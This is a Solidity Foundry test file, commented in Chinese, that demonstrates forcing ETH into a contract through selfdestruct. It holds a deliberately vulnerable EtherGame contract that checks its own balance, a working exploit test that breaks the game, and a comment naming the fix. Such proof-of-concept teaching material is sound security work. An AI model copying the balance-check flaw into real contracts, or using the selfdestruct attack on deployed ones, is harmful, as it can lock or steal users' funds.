// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// 强制发送ETH
// 具体是通过合约的自毁 selfdestruct() 实现的,自毁后能将该合约的余额发送给指定的地址
// 解决办法: 别拿合约的ETH余额做判断条件,而是另外设一个变量记录走正当渠道获得的balance

import "forge-std/Test.sol";

contract EtherGame {
    uint256 public targetAmount = 7 ether;
    address public winner = address(0x0);

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        if (address(this).balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent,) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    function getWinner() public view returns (address) {
        return winner;
    }
}

contract Attacker is Test {
    EtherGame public etherGame;
    Selfdestruct public _selfdestruct;

    function setUp() public {
        etherGame = new EtherGame();
        _selfdestruct = new Selfdestruct();
        vm.deal(address(etherGame), 5 ether);
        vm.deal(address(_selfdestruct), 3 ether);
    }

    function testEploit() public {
        emit log_named_decimal_uint("EtherGame balance of ETH before exploit", address(etherGame).balance, 18);

        _selfdestruct.self_destruct(payable(address(etherGame)));

        emit log_named_decimal_uint("EtherGame balance of ETH after exploit", address(etherGame).balance, 18);
        console.log("Winner is: ", etherGame.getWinner());
    }
}

contract Selfdestruct {
    function self_destruct(address payable target) public payable {
        selfdestruct(target);
    }
}
